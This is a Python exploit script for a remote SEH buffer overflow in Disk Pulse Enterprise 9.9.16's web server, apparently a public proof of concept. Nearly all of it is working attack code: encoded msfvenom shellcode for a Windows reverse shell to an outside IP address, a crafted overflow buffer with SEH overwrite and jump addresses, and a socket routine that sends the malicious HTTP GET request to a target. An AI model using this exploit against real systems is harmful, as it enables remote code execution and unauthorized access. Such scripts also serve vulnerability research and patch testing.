#!/usr/bin/env python
# Exploit Title: Disk Pulse Enterprise 9.9.16 Remote SEH Buffer Overflow
# Date: 2017-08-25
# Exploit Author: Nipun Jaswal & Anurag Srivastava
# Author Homepage: www.pyramidcyber.com
# Vendor Homepage: http://www.diskpulse.com
# Software Link: http://www.diskpulse.com/setups/diskpulseent_setup_v9.9.16.exe
# Version: v9.9.16
# Tested on: Windows 7 SP1 x64
# Steps to Reproduce : Go to Options --> Server --> Check Enable Web Server on Port, Enter Any Port[8080] --> Save 
import socket,sys
target = "192.168.99.10"
port = 80

#msfvenom -p windows/shell_reverse_tcp LHOST=185.92.223.120 LPORT=4443 EXITFUN=none -e x86/alpha_mixed -f python
buf =  ""
buf += "\x89\xe3\xda\xde\xd9\x73\xf4\x5b\x53\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x4d\x38\x6d"
buf += "\x52\x35\x50\x37\x70\x65\x50\x71\x70\x6b\x39\x4d\x35"
buf += "\x70\x31\x4b\x70\x63\x54\x6c\x4b\x56\x30\x76\x50\x4c"
buf += "\x4b\x63\x62\x76\x6c\x4c\x4b\x50\x52\x76\x74\x4c\x4b"
buf += "\x42\x52\x36\x48\x34\x4f\x58\x37\x51\x5a\x37\x56\x46"
buf += "\x51\x79\x6f\x6e\x4c\x55\x6c\x31\x71\x51\x6c\x67\x72"
buf += "\x34\x6c\x51\x30\x59\x51\x48\x4f\x36\x6d\x65\x51\x79"
buf += "\x57\x59\x72\x6b\x42\x72\x72\x72\x77\x4c\x4b\x52\x72"
buf += "\x76\x70\x6c\x4b\x61\x5a\x77\x4c\x6e\x6b\x42\x6c\x66"
buf += "\x71\x50\x78\x6a\x43\x32\x68\x75\x51\x6b\x61\x36\x31"
buf += "\x4e\x6b\x70\x59\x47\x50\x75\x51\x7a\x73\x4c\x4b\x30"
buf += "\x49\x66\x78\x79\x73\x64\x7a\x73\x79\x6c\x4b\x45\x64"
buf += "\x4c\x4b\x36\x61\x7a\x76\x50\x31\x6b\x4f\x4e\x4c\x4f"
buf += "\x31\x7a\x6f\x36\x6d\x43\x31\x39\x57\x74\x78\x6b\x50"
buf += "\x31\x65\x6b\x46\x43\x33\x53\x4d\x68\x78\x77\x4b\x33"
buf += "\x4d\x31\x34\x44\x35\x78\x64\x56\x38\x6e\x6b\x36\x38"
buf += "\x75\x74\x56\x61\x78\x53\x65\x36\x4e\x6b\x66\x6c\x30"
buf += "\x4b\x6e\x6b\x33\x68\x65\x4c\x63\x31\x68\x53\x6c\x4b"
buf += "\x65\x54\x4e\x6b\x33\x31\x58\x50\x6e\x69\x43\x74\x31"
buf += "\x34\x65\x74\x53\x6b\x71\x4b\x71\x71\x46\x39\x72\x7a"
buf += "\x53\x61\x39\x6f\x49\x70\x43\x6f\x61\x4f\x61\x4a\x4e"
buf += "\x6b\x44\x52\x78\x6b\x6e\x6d\x33\x6d\x33\x58\x75\x63"
buf += "\x50\x32\x35\x50\x37\x70\x32\x48\x54\x37\x70\x73\x34"
buf += "\x72\x63\x6f\x66\x34\x62\x48\x52\x6c\x52\x57\x44\x66"
buf += "\x43\x37\x39\x6f\x79\x45\x4c\x78\x4e\x70\x43\x31\x45"
buf += "\x50\x57\x70\x34\x69\x6f\x34\x51\x44\x70\x50\x53\x58"
buf += "\x76\x49\x6f\x70\x50\x6b\x33\x30\x79\x6f\x5a\x75\x50"
buf += "\x50\x46\x30\x42\x70\x46\x30\x51\x50\x62\x70\x67\x30"
buf += "\x70\x50\x30\x68\x79\x7a\x56\x6f\x69\x4f\x49\x70\x69"
buf += "\x6f\x48\x55\x6f\x67\x52\x4a\x36\x65\x75\x38\x68\x39"
buf += "\x33\x6c\x6b\x6f\x74\x38\x52\x48\x43\x32\x57\x70\x44"
buf += "\x51\x71\x4b\x4c\x49\x4b\x56\x31\x7a\x72\x30\x56\x36"
buf += "\x50\x57\x63\x58\x6d\x49\x6d\x75\x34\x34\x63\x51\x79"
buf += "\x6f\x4b\x65\x6c\x45\x6b\x70\x43\x44\x36\x6c\x69\x6f"
buf += "\x72\x6e\x76\x68\x52\x55\x48\x6c\x52\x48\x78\x70\x6c"
buf += "\x75\x6f\x52\x52\x76\x4b\x4f\x4e\x35\x42\x48\x43\x53"
buf += "\x50\x6d\x35\x34\x63\x30\x6e\x69\x4d\x33\x62\x77\x43"
buf += "\x67\x56\x37\x75\x61\x39\x66\x42\x4a\x62\x32\x31\x49"
buf += "\x70\x56\x69\x72\x39\x6d\x72\x46\x59\x57\x51\x54\x45"
buf += "\x74\x77\x4c\x33\x31\x46\x61\x4e\x6d\x37\x34\x57\x54"
buf += "\x56\x70\x68\x46\x47\x70\x62\x64\x36\x34\x46\x30\x61"
buf += "\x46\x36\x36\x62\x76\x70\x46\x72\x76\x32\x6e\x61\x46"
buf += "\x30\x56\x56\x33\x70\x56\x73\x58\x53\x49\x48\x4c\x55"
buf += "\x6f\x4f\x76\x49\x6f\x4a\x75\x4f\x79\x39\x70\x52\x6e"
buf += "\x72\x76\x37\x36\x4b\x4f\x56\x50\x61\x78\x65\x58\x4e"
buf += "\x67\x57\x6d\x75\x30\x39\x6f\x59\x45\x6f\x4b\x78\x70"
buf += "\x4d\x65\x4e\x42\x71\x46\x71\x78\x6e\x46\x6c\x55\x4f"
buf += "\x4d\x6f\x6d\x79\x6f\x59\x45\x35\x6c\x53\x36\x53\x4c"
buf += "\x54\x4a\x4d\x50\x6b\x4b\x4b\x50\x54\x35\x65\x55\x6d"
buf += "\x6b\x63\x77\x55\x43\x43\x42\x32\x4f\x63\x5a\x43\x30"
buf += "\x72\x73\x4b\x4f\x48\x55\x41\x41"


payload = buf # Shellcode begins from the start of the buffer
payload += 'A' * (2492   - len(payload)) # Padding after shellcode till the offset value
payload += '\xEB\x10\x90\x90' # NSEH, a short jump of 10 bytes
payload += '\xDD\xAD\x13\x10' # SEH : POP EDI POP ESI RET 04  libpal.dll
payload += '\x90' * 10 # NOPsled
payload += '\xE9\x25\xBF\xFF\xFF' # Second JMP to ShellCode 
payload += 'D' * (5000-len(payload)) # Additional Padding

s  = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.connect((target,port))
    print("[*] Connection Success.")
except:
    print("Connction Refused %s:%s" %(target,port))
    sys.exit(2)
    
packet =  "GET /../%s HTTP/1.1\r\n" %payload # Request & Headers
packet += "Host: 4.2.2.2\r\n"
packet += "Connection: keep-alive\r\n"
packet += "Referer: http://pyramidcyber.com\r\n"
packet += "\r\n"
s.send(packet)
s.close()